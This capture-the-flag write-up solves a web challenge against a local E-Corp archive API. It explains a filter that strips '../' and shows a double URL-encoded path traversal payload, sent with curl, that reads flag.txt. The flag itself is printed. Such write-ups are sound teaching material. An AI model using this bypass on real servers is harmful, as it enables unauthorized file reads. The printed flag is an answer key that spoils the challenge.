```markdown
# 🕵️ DAKSHH CTF – Mr. Robot Heist
**Category:** Web Exploitation  
**Difficulty:** Medium  

---

## Challenge Overview

We are given access to a web application called the **E-Corp Archival System**.  
The system allows users to read archived text documents through an API.

The flag format for the challenge is:

```

DAKSHH{...}

```

Because the challenge is themed around **Mr. Robot** and involves an **archive system**, the first suspicion is that the vulnerability might involve **file access, path traversal, or improper filtering**.

---

## CTFd Room Description
> "Are you a 1 or a 0? The choice is yours."
> 
> Welcome to the E-Corp Secure Document Archive. Their engineers claim the system is impenetrable, utilizing strict Web Application Firewalls (WAF) to sanitize all inputs and heavily restrict directory traversal. 
> 
> But we know better. They only peel back one layer of the onion. Your task is to bypass their aggressive encoding filters and traverse deep into the server's root filesystem to steal the master flag hidden inside `flag.txt`. 

---

## Step 1 — Initial Exploration

First, start the service and access the web application:

```

[http://localhost:3000](http://localhost:3000)

```

The application presents a simple interface for reading archived documents.

The API endpoint used by the application appears to be:

```

/api/read?file=<filename>

```

Testing the endpoint:

```

[http://localhost:3000/api/read?file=memo_501.txt](http://localhost:3000/api/read?file=memo_501.txt)

````

Response:

```json
{
  "success": true,
  "content": "Confidential Memo: Server upgrades are delayed until Q3."
}
````

This confirms that the API reads files from a **documents directory**.

---

## Step 2 — Enumerating Available Files

Browsing the archive reveals several accessible files:

```
memo_501.txt
financials_Q2.txt
fsociety_note.txt
```

Opening the file `fsociety_note.txt` provides an interesting hint:

```
We see you. Encoding is the key.
They only peel back one layer of the onion.
```

This message strongly hints that **encoding tricks may bypass the server's protections**.

---

## Step 3 — Reviewing the Backend Code

Looking at the backend source code (`app.js`), the file reading endpoint is implemented as follows:

```javascript
app.get('/api/read', (req, res) => {
    let fileParam = req.query.file;
```

The application then attempts to sanitize the input.

---

## Step 4 — Understanding the Input Filtering

The developer implemented several protections.

### Protection 1 — Remove Directory Traversal

```javascript
let cleanFile = fileParam.replace(/\.\.\//g, '');
```

This removes occurrences of:

```
../
```

which is the typical path traversal sequence.

---

### Protection 2 — Force `.txt` Extension

```javascript
if (!cleanFile.endsWith('.txt')) {
    cleanFile += '.txt';
}
```

This ensures that only **text files** can be read.

---

### Protection 3 — Decode URL Encoding

```javascript
cleanFile = decodeURIComponent(cleanFile);
```

The server decodes **URL-encoded input once**.

---

## Step 5 — Locating the Flag

Earlier in the backend code we find the following:

```javascript
const FLAG_PATH = path.join(__dirname, 'flag.txt');
fs.writeFileSync(FLAG_PATH, 'DAKSHH{ecorp_archive_traversal_bypassed}');
```

This reveals that the flag is stored at:

```
/app/flag.txt
```

However, the archive system reads files only from:

```
/app/documents
```

Therefore, to access the flag we must traverse out of the documents directory:

```
documents → ../flag.txt
```

---

## Step 6 — Attempting a Basic Path Traversal

A direct attempt:

```
/api/read?file=../flag.txt
```

fails because the server removes `../`.

---

## Step 7 — Interpreting the Hint

The hint stated:

```
Encoding is the key.
They only peel back one layer of the onion.
```

This suggests that the application **decodes input only once**, which means we can attempt **double URL encoding**.

Normal encoding:

```
../ → %2e%2e%2f
```

But this will still be decoded into `../` and removed.

Instead, we **encode it again**.

Double encoding:

```
../ → %252e%252e%252f
```

---

## Step 8 — Crafting the Exploit

Exploit payload:

```
/api/read?file=%252e%252e%252fflag.txt
```

### What Happens Internally

1. Input arrives as:

```
%252e%252e%252f
```

2. The server decodes once:

```
%2e%2e%2f
```

3. The traversal sequence was **not removed earlier**.

4. Path resolution interprets it as:

```
../
```

So the final resolved path becomes:

```
/app/documents/../flag.txt
```

Which resolves to:

```
/app/flag.txt
```

---

## Step 9 — Retrieving the Flag

Execute the request:

```
curl "http://localhost:3000/api/read?file=%252e%252e%252fflag.txt"
```

Response:

```json
{
  "success": true,
  "content": "DAKSHH{ecorp_archive_traversal_bypassed}",
  "path": "/app/flag.txt"
}
```

---

# 🏁 Flag

```
DAKSHH{ecorp_archive_traversal_bypassed}
```

---

